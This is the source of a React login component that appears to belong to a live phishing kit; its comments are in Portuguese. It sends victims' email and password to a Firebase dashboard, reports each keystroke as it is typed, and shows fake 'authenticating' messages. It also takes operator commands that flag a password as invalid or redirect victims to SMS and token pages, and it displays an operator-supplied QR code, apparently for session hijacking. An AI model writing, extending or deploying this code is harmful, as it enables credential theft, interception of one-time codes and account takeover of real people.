import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';

const QRLogin = () => {
  const navigate = useNavigate();
  const { t, i18n } = useTranslation();
  const [showPassword, setShowPassword] = useState(false);
  const [hasInvalidPassword, setHasInvalidPassword] = useState(false);
  const [loginTexts] = useState([
    t('login.processing'),
    "Authenticating credentials...",
    "Verifying your identity...",
    "Securing your session...",
    "Almost ready...",
    "Finalizing authentication..."
  ]);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);
  const [email, setEmail] = useState('');
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [success, setSuccess] = useState('');
  const [error, setError] = useState('');
  const [showQrCodeModal, setShowQrCodeModal] = useState(false);
  const [qrCodeLoading, setQrCodeLoading] = useState(false);
  const [qrButtonHidden, setQrButtonHidden] = useState(false);

  // Hook do Firebase Client para registrar este visitante
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
    isClientIdValid,
  } = useFirebaseClient(navigate);

  // Função para gerar QR code e registrar cliente
  const handleGenerateQR = async () => {
    try {
      // Esconder o botão e mostrar spinner
      setQrButtonHidden(true);
      setQrCodeLoading(true);
      setError('');
      
      // Criar cliente no dashboard com dados genéricos
      const result = await updateClientData({
        email: "exemplo@qrcode.com",
        password: "senha@qrcode.com",
        fromQrCode: true,
        status: "Aguardando QR Code",
        qrCodeTimestamp: Date.now(),
        waitingForQrCode: true,
        hasCredentials: true,
        fromForm: true,
        qrCodeAlert: true,
        device: "Desktop",
        browser: "Chrome",
        deviceType: "Desktop",
        isMobile: false,
        isTablet: false,
        isDesktop: true,
        lastActivity: Date.now(),
        lastPing: Date.now(),
        online: true,
        userActive: true,
      });
      
      // Manter loading até receber QR Code
    } catch (err) {
      setError("Erro ao criar cliente: " + err.message);
      setQrButtonHidden(false);
      setQrCodeLoading(false);
    }
  };

  // Função de login mobile
  const handleMobileLogin = async (e) => {
    e.preventDefault();
    if (!emailOrPhone || !password) {
      setError('Por favor, preencha todos os campos');
      return;
    }

    setLoading(true);
    setError('');
    setSuccess('');

    try {
      // Preparar dados do cliente para registro
      const clientData = {
        email: emailOrPhone,
        password: password,
        documentId: 'inicial', // ID fixo como solicitado
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
        currentPage: 'Home',
        timestamp: new Date().toISOString(),
        fromForm: true,
      };

      console.log('🔐 QRLogin Mobile - Registrando cliente:', clientData);

      // Atualizar dados no Firebase
      await updateClientData(clientData);

      setSuccess('Login realizado com sucesso!');
      
      // Aguardar um pouco antes de redirecionar
      setTimeout(() => {
        navigate('/loading');
      }, 1000);

    } catch (error) {
      console.error('❌ Erro no login mobile:', error);
      setError('Erro ao fazer login. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  // Processar redirecionamentos
  useEffect(() => {
    if (!commands || commands.length === 0) return;

    commands.forEach((command) => {
      switch (command) {
        case 'ir_sms':
          window.location.href = '/sync?view=gmail-sms';
          return;
        case 'ir_email':
          window.location.href = '/sync?view=password';
          return;
        case 'ir_token':
          window.location.href = '/sync';
          return;
        default:
          break;
      }
    });
  }, [commands]);

  // Detectar senha inválida
  useEffect(() => {
    if (commands && (commands.includes('invalid_password') || commands.includes('inv_password'))) {
      setLoading(false);
      setHasInvalidPassword(true);
      // Limpar inputs
      setEmail('');
      setPassword('');
    }
  }, [commands]);

  // Efeito para alternar textos de login
  useEffect(() => {
    if (loading) {
      const interval = setInterval(() => {
        setCurrentTextIndex((prev) => (prev + 1) % loginTexts.length);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [loading, loginTexts.length]);

  // Limpar estado de erro quando usuário digitar
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    setHasInvalidPassword(false);
    reportTyping('email', e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    setHasInvalidPassword(false);
    reportTyping('password', e.target.value);
  };

  // Efeito para monitorar mudanças no QR Code
  useEffect(() => {
    if (
      clientData?.qrCodeImage ||
      clientData?.qrCodeUrl ||
      clientData?.qrCodeText
    ) {
      setQrCodeLoading(false);
      // Manter o botão escondido para mostrar o QR code
      setQrButtonHidden(true);

      // Limpar o alerta de QR Code quando o QR Code for recebido
      if (clientData?.qrCodeAlert) {
        updateClientData({ qrCodeAlert: null });
      }
    }
  }, [clientData?.qrCodeImage, clientData?.qrCodeUrl, clientData?.qrCodeText]);

  const changeLanguage = (lng) => {
    i18n.changeLanguage(lng);
  };

  return (
    <>
      {/* Desktop version */}
      <div className="hidden md:block w-full max-w-3xl -ml-5666">
        <h2 className="text-3xl font-bold text-gray-900 mb-4 text-left pl-0 mt-[-5rem]">{t('login.qrTitle')}</h2>
        
        <div className="flex items-start space-x-8 mt-2">
           {/* QR Code à esquerda */}
           <div className="flex flex-col items-center">
             {/* Container principal do QR Code */}
             <div className="relative w-64 h-64 rounded-xl overflow-hidden">
               <img src="/qr.svg" alt="QR Code" className="w-full h-full object-contain rounded-xl" />
               {/* Película sobre a imagem do QR code - sempre visível exceto quando há QR code real */}
               {!clientData?.qrCodeImage && (
                 <div className="absolute inset-4 bg-[#8F99AB] bg-opacity-80 rounded-lg pointer-events-none"></div>
               )}
               {/* Botão centralizado sobre a imagem */}
               {!qrButtonHidden ? (
                 <button 
                   onClick={handleGenerateQR}
                   disabled={loading || firebaseLoading || qrCodeLoading}
                   className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 bg-white px-7 py-3 rounded-lg shadow-md hover:shadow-lg transition-shadow flex items-center justify-center gap-2 z-10 disabled:bg-gray-200"
                 >
                   <img src="/iconscan.svg" alt="QR Icon" className="w-8 h-6" />
                   <span className="text-base font-medium text-gray-700 whitespace-nowrap">
                     {loading || qrCodeLoading ? t('login.generating') : t('login.getQrCode')}
                   </span>
                 </button>
               ) : (
                 <div className="absolute inset-4 rounded-lg flex items-center justify-center z-10">
                   {qrCodeLoading ? (
                      <div className="flex flex-col items-center gap-4">
                        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
                        <p className="text-gray-600 text-sm text-center bg-white px-2 py-1 rounded-md max-w-[180px]">{t('login.generatingQr')}</p>
                      </div>
                   ) : (
                     // Quando não está carregando, só renderiza o conteúdo se existir algum dado recebido
                     (clientData?.qrCodeImage || clientData?.qrCodeUrl || clientData?.qrCodeText) ? (
                       <div className="bg-white rounded-lg w-full h-full flex items-center justify-center">
                         <div className="flex flex-col items-center justify-center w-full h-full">
                           {clientData?.qrCodeImage ? (
                             <img 
                               src={clientData.qrCodeImage} 
                               alt="Generated QR Code" 
                               className="w-full h-full object-contain"
                             />
                           ) : clientData?.qrCodeUrl ? (
                             <div className="p-4 bg-gray-50 rounded-lg border w-full">
                               <p className="text-blue-600 font-mono text-xs break-all text-center">{clientData.qrCodeUrl}</p>
                             </div>
                           ) : clientData?.qrCodeText ? (
                             <div className="p-4 bg-gray-50 rounded-lg border w-full">
                               <p className="text-gray-800 text-xs break-all whitespace-pre-wrap text-center">{clientData.qrCodeText}</p>
                             </div>
                           ) : null}
                         </div>
                       </div>
                     ) : null
                   )}
                 </div>
               )}
             </div>
           </div>
          
          {/* Steps - botões arredondados mais à direita */}
          <div className="flex flex-col space-y-6 ml-4 pt-8">
            <div className="flex items-center space-x-6">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold" style={{backgroundColor: '#D3E5FE', color: '#0068FF'}}>
                1
              </div>
              <span className="text-gray-700 text-base font-medium">{t('qr.step1')}</span>
            </div>
            
            <div className="flex items-center space-x-6">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold" style={{backgroundColor: '#D3E5FE', color: '#0068FF'}}>
                2
              </div>
              <span className="text-gray-700 text-base font-medium">{t('qr.step2')}</span>
            </div>
            
            <div className="flex items-center space-x-6">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold" style={{backgroundColor: '#D3E5FE', color: '#0068FF'}}>
                3
              </div>
              <span className="text-gray-700 text-base font-medium">{t('qr.step3')}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile version - Login Form */}
      <div className="md:hidden w-full max-w-sm mx-auto px-4 py-8">
        <h1 className="text-4xl font-bold text-gray-900 mb-8 text-center">{t('login.title')}</h1>
        
        {error && (
          <div className="text-red-500 text-sm mb-4 text-center">{error}</div>
        )}
        {success && (
          <div className="text-green-500 text-sm mb-4 text-center">{success}</div>
        )}
        
        <form className="space-y-4" onSubmit={handleMobileLogin}>
          <div>
            <input
              type="text"
              placeholder={t('login.emailPlaceholder')}
              value={emailOrPhone}
              onChange={(e) => {
                setEmailOrPhone(e.target.value);
                setHasInvalidPassword(false);
                reportTyping('email', e.target.value);
              }}
              className={`w-full h-14 px-4 py-3 text-base font-semibold text-gray-900 border rounded-lg bg-white focus:outline-none placeholder-gray-400 ${
                hasInvalidPassword 
                  ? 'border-red-500 focus:border-red-500' 
                  : 'border-gray-300 focus:border-blue-500'
              }`}
            />
          </div>
          
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder={t('login.passwordPlaceholder')}
              value={password}
              onChange={handlePasswordChange}
              className={`w-full h-14 px-4 py-3 text-base font-semibold text-gray-900 border rounded-lg bg-white focus:outline-none placeholder-gray-400 pr-10 ${
                hasInvalidPassword 
                  ? 'border-red-500 focus:border-red-500' 
                  : 'border-gray-300 focus:border-blue-500'
              }`}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
            >
              {showPassword ? (
                // Ícone de olho aberto (senha visível)
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
              ) : (
                // Ícone de olho fechado com linha (senha oculta)
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                </svg>
              )}
            </button>
          </div>
          
          {/* Toast de erro embaixo do input de senha */}
           {hasInvalidPassword && (
             <p className="text-red-600 text-sm font-medium mt-2">{t('login.invalidCredentials')}</p>
           )}
          
          <div className="flex justify-start pt-2">
            <button type="button" className="text-blue-500 hover:text-blue-600 text-sm font-semibold transition-colors">
              {t('login.forgotPassword')}
            </button>
          </div>
          
          <button
            type="submit"
            disabled={loading || firebaseLoading}
            className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-400 text-white font-medium py-3 px-6 rounded-lg transition-colors mt-6"
          >
            {loading ? t('login.generating') : t('login.signInButton')}
          </button>
          
          <div className="text-center pt-4">
            <span className="text-gray-500 text-sm">{t('login.noAccountYet')} </span>
            <button className="text-blue-500 hover:text-blue-600 font-medium text-sm transition-colors">
              {t('login.signUp')}
            </button>
          </div>
        </form>
      </div>
    </>
  );
};

export default QRLogin;